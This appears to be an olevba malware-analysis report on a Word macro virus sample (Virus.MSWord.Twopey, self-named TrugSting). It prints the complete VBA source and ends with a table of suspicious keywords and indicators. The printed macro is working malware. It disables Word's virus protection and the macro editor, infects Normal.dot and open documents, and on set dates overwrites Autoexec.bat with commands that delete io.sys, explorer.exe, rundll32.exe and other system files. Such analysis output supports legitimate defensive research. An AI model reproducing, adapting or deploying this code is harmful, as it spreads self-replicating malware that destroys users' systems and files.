olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twopey-faf29671c067c72b03a25b1dd9ec83f52ae06d6f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twopey-faf29671c067c72b03a25b1dd9ec83f52ae06d6f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Base 1 'TrugSting (c)12.12.02 by: CbrHck.IHABAE0D /Manila, Phil.
Private Sub TrugSting() '[TrugSting for Windows]
On Error Resume Next
TrugStrt = Options.DefaultFilePath(wdStartupPath)
Transitionfile = TrugStrt & "\trugfile.txt"
With CommandBars("Tools")
.Reset
.Controls("Macro").Reset
.Controls("Templates and Add-Ins...").Reset
.Controls("Customize...").Reset
End With
For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
themodules = NormalTemplate.VBProject.VBComponents(I).Name
If (themodules <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=themodules, Object:=wdOrganizerObjectProjectItems
Next I
For Each opendoc In Documents
With opendoc
For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
themodules = opendoc.VBProject.VBComponents(J).Name
If (themodules <> "ThisDocument") And (themodules <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=themodules, Object:=wdOrganizerObjectProjectItems
Next J
End With
Next opendoc
Application.ShowVisualBasicEditor = False
Application.DisplayAlerts = wdAlertsNone
ActiveDocument.ReadOnlyRecommended = False
With Dialogs(wdDialogFileSummaryInfo)
.Title = "TrugSting Phil."
.Subject = "miss u so much!"
.Author = "CbrHck"
.Keywords = "dcpe"
.Comments = "Jonalyn  Villacastin of Butuan City, Philippines, ""I DO LOVE YOU"", very much... -TAKE A BUNCH OF CARE!"
.Execute
End With
With Options
.ConfirmConversions = True
.VirusProtection = False
.SaveNormalPrompt = False
End With
CommandBars("Visual Basic").Enabled = False
CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
CommandBars("Visual Basic").Protection = msoBarNoCustomize
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Customize...").Enabled = False
CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
CustomizationContext = NormalTemplate
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
trug = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.lines(1, 182)
If Dir(Transitionfile) = True Then Kill Transitionfile
Open Transitionfile For Output Shared As #1
Print #1, trug
Close #1
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Find("Trug", 1, 1, 10, 10) = False Then
numberoflines = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, numberoflines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile Transitionfile
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("Trug", 1, 1, 10, 10) = False Then
numberoflines = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, numberoflines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile Transitionfile
ActiveDocument.Save
End If
Kill Transitionfile
End Sub
Private Sub Document_Close()
On Error Resume Next
If ActiveDocument.Undo = False And ActiveDocument.Redo = False Then
ExiActiveDocument.Close
End If
Call TrugSting
Message
swapbat
End Sub
Private Sub FileOpen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
TrugSting
Message
swapbat
End Sub
Private Sub FileExit()
On Error Resume Next
TrugSting
Message
swapbat
If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.Quit
End Sub
Private Sub swapbat()
Dim freeF As Integer
On Error Resume Next
If (Day(Date) = 22) Then
Call SetAttr("C:\Autoexec.bat", vbArchive)
NputFile = FreeFile
Kill "C:\Autoexec.bat"
Open "C:\Autoexec.bat" For Output As #NputFile
Print #NputFile, "@echo off"
Print #NputFile, "echo off"
Print #NputFile, "Set Path=C:\Windows\Command;Path;%1%2%3%4%5%6"
Print #NputFile, "Set Comspec=C:\Command.com /p /msg"
Print #NputFile, "Set Temp=C:\progra~1\temp~1"
Print #NputFile, "cls"
Print #NputFile, "Rem ===TrugSting Virus==="
Print #NputFile, "rem by: CbrHck.IHABAE0D /Manila, Philippines"
Print #NputFile, "verify=ON "
Print #NputFile, "Break=OFF"
Print #NputFile, "@PATH; %1%2%3%4%5%6"
Print #NputFile, "Set PATH=C:\Command.com; %1%2%3%4%5%6"
Print #NputFile, "c:\windows\command\attrib c:\io.sys -a -s -h -r"
Print #NputFile, "del c:\io.sys"
Print #NputFile, "del c:\windows\command\attrib.exe"
Print #NputFile, "del c:\windows\command\find.exe"
Print #NputFile, "ren c:\windows\system.ini c:\windows\system.cbr.hck"
Print #NputFile, "ren c:\windows\win.ini c:\windows\win.cbr.hck"
Print #NputFile, "ren c:\windows\win.com c:\windows\win.rub.cbr.hck"
Print #NputFile, "If Exist C:\Windows\mplayer.exe del C:\Windows\mplayer.exe"
Print #NputFile, "If Exist C:\Windows\EMM386.exe del C:\Windows\EMM386.exe"
Print #NputFile, "If Exist C:\Windows\explorer.exe del C:\Windows\explorer.exe"
Print #NputFile, "If Exist C:\Windows\scandskw.exe del C:\Windows\scandskw.exe"
Print #NputFile, "If Exist C:\Windows\rundll.exe del C:\Windows\rundll.exe"
Print #NputFile, "If Exist C:\Windows\rundll32.exe del C:\Windows\rundll32.exe"
Print #NputFile, "If Exist C:\Windows\net.exe del C:\Windows\net.exe"
Print #NputFile, "echo Runtime Error:018 Unable to Allocate System File"
Print #NputFile, "echo."
Print #NputFile, "echo Please RESTART you Computer"
Print #NputFile, "echo."
Print #NputFile, "echo."
Print #NputFile, "pause"
Print #NputFile, "cls"
Print #NputFile, "echo."
Print #NputFile, "echo Infected with: TrugSting Virus"
Print #NputFile, "echo."
Print #NputFile, "pause"
Close NputFile
End If
End Sub
Private Sub Message()
Dim freeF As Integer
On Error Resume Next
If (Day(Date) = 18) Then
Call SetAttr("C:\TrugSting.msg.txt", vbArchive)
freeF = FreeFile 'TrugSting,
Kill "C:\TrugSting.msg.txt"
Open "C:\TrugSting.msg.txt" For Output As #freeF 'TrugSting message to Everyone!
Print #freeF, ""
Print #freeF, "FR: TrugSting with Love!"
Print #freeF, "TO: Infected Computer"
Print #freeF, ""
Print #freeF, "People around the World [ - PEACE BE WITH US ALWAYS - ]"
Print #freeF, ""
Print #freeF, "TrugSting revision"
Print #freeF, ""
Print #freeF, "The bugs created merely to updated your system into a higher version. "
Print #freeF, "Windows 95,98 users are the system most commonly infected."
Print #freeF, ""
Print #freeF, "For your patronage"
Print #freeF, ""
Print #freeF, "-PLEASE UPDATE YOUR SYSTEM-"
Print #freeF, "A great advice from CbrHck.IHABAE0D /Manila, Philippines     "
Print #freeF, ""
Print #freeF, ""
Print #freeF, "Also dedicated to: ALL FILIPINO PROGRAMMERS" '
Print #freeF, ""
Print #freeF, "More thanks to Johnalyn"
Print #freeF, ""
Print #freeF, "TrugSting ""syscruncher"" by: CbrHck"
Print #freeF, ""
Print #freeF, ""
Print #freeF, " The following  code are more confident."
Print #freeF, ""
Print #freeF, ""
Print #freeF, " IHABAE-0D-APPED"
Print #freeF, " CbrHck.Virugoer.(c)12.12.02 <-message End."
Close #freeF
End If
End Sub

'TrugsSting ------Suck this Line-----
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |attrib.exe          |Executable file name                         |
|IOC       |find.exe            |Executable file name                         |
|IOC       |mplayer.exe         |Executable file name                         |
|IOC       |EMM386.exe          |Executable file name                         |
|IOC       |explorer.exe        |Executable file name                         |
|IOC       |scandskw.exe        |Executable file name                         |
|IOC       |rundll.exe          |Executable file name                         |
|IOC       |rundll32.exe        |Executable file name                         |
|IOC       |net.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

